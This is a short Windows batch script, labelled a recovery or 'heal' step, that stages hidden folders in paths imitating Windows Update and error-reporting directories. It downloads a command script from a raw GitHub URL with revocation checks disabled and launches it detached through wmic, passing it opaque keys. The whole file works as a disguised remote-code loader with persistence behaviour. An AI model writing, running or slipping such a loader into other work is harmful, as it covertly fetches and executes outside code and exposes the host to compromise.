@echo off
rem RECOVER_ONE - pull G10 + HEAL 1060 on this host (no ProductCode /x). Sevrz 10s-safe if run detached.
setlocal
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=e5fb335"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 45 -o "%WD%\own_gryxa.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_gryxa.cmd?t=%RANDOM%"
findstr /C:"OWN_GRYXA BUILD 20260804G10" "%WD%\own_gryxa.cmd"
del /f /q "%WD%\gryxa_msi.lock" "%WD%\gryxa_heal.flag" >nul 2>&1
> "%STAGE%\gryxa_heal_once.cmd" (
  echo @echo off
  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" HEAL ^>^>"%WD%\own_gryxa.log" 2^>^&1
)
wmic process call create "cmd.exe /c %STAGE%\gryxa_heal_once.cmd"
echo QUEUED G10 HEAL
endlocal
